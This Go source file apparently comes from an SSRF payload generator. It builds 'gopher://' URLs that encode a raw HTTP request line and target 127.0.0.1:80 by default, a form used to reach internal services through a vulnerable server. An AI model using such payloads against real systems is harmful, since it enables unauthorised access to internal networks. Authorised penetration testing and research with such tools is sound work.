package http

import (
	"fmt"
	"strings"
)

const (
	DefaultAddr    = "127.0.0.1:80"
	DefaultMethod  = "GET"
	DefaultVersion = "HTTP/1.0"
	DefaultPath    = "/"
)

type Options struct {
	Addr    string
	Method  string
	Version string
	Path    string
}

type HTTP struct {
	addr    string
	method  string
	version string
	path    string
}

func NewHTTP(optFns ...func(o *Options)) *HTTP {
	options := Options{
		Addr:    DefaultAddr,
		Method:  DefaultMethod,
		Version: DefaultVersion,
		Path:    DefaultPath,
	}

	for _, fn := range optFns {
		fn(&options)
	}

	return &HTTP{
		addr:    strings.TrimSpace(options.Addr),
		method:  strings.TrimSpace(options.Method),
		version: strings.TrimSpace(options.Version),
		path:    strings.TrimSpace(options.Path),
	}
}

func (http *HTTP) Payload() string {
	start := fmt.Sprintf("%s%%20%s%%20%s", http.method, http.path, http.version)
	// headers := ""
	// body := ""
	payload := start
	payload = fmt.Sprintf("%s%%0A%%0A", payload)

	return fmt.Sprintf("gopher://%s/_%s", http.addr, payload)
}
